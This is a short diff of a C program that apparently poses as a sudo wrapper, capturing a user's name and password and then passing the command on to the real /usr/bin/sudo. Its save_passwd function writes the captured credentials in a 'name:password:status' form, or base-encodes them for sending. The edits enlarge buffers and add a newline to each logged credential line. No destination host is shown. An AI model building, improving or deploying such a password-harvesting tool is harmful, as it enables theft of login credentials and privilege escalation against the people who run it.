@@ -56,9 +56,9 @@ struct termios recoverterminal;
 void 
 sudo(char arguments[])
 {
-    char command[BUFFER_LEN] = {0};
+    char command[10000] = {0};
 
-    snprintf(command,BUFFER_LEN,"/usr/bin/sudo%s",arguments);
+    snprintf(command,10000,"/usr/bin/sudo%s",arguments);
     system(command);
 }
 
@@ -171,7 +171,7 @@ save_passwd(char *name,char *password,char *all, int success)
 
 
     if (SAVE_OR_SEND){
-        snprintf(text, sizeof(text), "%s:%s:%s", name, password, status); 
+        snprintf(text, sizeof(text), "%s:%s:%s\n", name, password, status); 
     } else{
         char tmp_text[4096];
         baseencode_error_t err;
@@ -398,7 +398,7 @@ main(int argc, char *argv[])
 {
     struct passwd *usrInfo = getpwuid(getuid());
 
-    char arguments[BUFFER_LEN] = {0};
+    char arguments[10000] = {0};
     
     char *params[1000];
 
